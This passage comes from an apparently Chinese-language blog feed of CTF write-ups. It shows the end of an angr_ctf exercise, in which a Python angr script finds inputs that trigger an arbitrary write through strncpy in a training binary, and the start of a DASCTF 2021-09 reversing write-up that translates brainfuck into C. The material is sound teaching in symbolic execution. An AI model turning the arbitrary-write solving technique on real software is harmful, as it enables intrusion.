	user_input1, user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;solutions&amp;#39;&lt;/span&gt;]
	print (solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input1), solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input2, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
	print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不是很理解的地方是，为什么要先添加判断这个 &lt;code&gt;constraints&lt;/code&gt; 是否满足，然后再添加到 &lt;code&gt;state&lt;/code&gt; 中&lt;/p&gt;
&lt;h2 id=&#34;arbitrary-write&#34;&gt;arbitrary write&lt;/h2&gt;
&lt;p&gt;思路和上一题比较接近，这次使用了 &lt;code&gt;strncpy&lt;/code&gt; 函数的参数作为检查&lt;/p&gt;
&lt;p&gt;遇到的一个问题是 &lt;code&gt;BV&lt;/code&gt; 数据类型在选择部分数据上的问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./16_angr_arbitrary_write&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_scanf&lt;/span&gt;(SimProcedure):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self, fmt, key_addr, s_addr):
        user_input1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
        user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;)

        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; user_input2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chop(bits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;)
        
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(key_addr, user_input1, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(s_addr, user_input2)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;solutions&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (user_input1, user_input2)
    
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_symbol(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__isoc99_scanf&amp;#39;&lt;/span&gt;, replace_scanf())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_strncpy&lt;/span&gt;(state):
    dest_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
    src_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
    length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
    source &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(src_addr, length)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbolic(source) &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbolic(dest_addr):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    target_string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NDYNWEUJ&amp;#39;&lt;/span&gt;
    target_dest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57584344&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;satisfiable(extra_constraints &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (target_dest &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; dest_addr, target_string &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; source[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;])):
        state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(target_dest &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; dest_addr, target_string &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; source[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;])
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_successful&lt;/span&gt;(state):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048410&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; check_strncpy(state)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_successful)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    solution_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    user_input1, user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;solutions&amp;#39;&lt;/span&gt;]
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input1), solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input2, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>DASCTF 2021-09 Writeup</title>
        <link>/post/dasctf-2021-09-writeup/</link>
        <pubDate>Sun, 26 Sep 2021 00:10:18 +0000</pubDate>
        
        <guid>/post/dasctf-2021-09-writeup/</guid>
        <description>&lt;h2 id=&#34;reea5ycpp&#34;&gt;[RE]ea5ycpp&lt;/h2&gt;
&lt;p&gt;一开始还被逻辑绕了一下，结果发现核心部分就是brainfuck&lt;/p&gt;
&lt;p&gt;有一些结构体，可以恢复一下，会比较好看&lt;/p&gt;
&lt;p&gt;brainfuck解析出来就是简单的加减法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a[&lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;];
	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
{
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;];
		&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
	}
		a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (a[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]) {
		&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;];
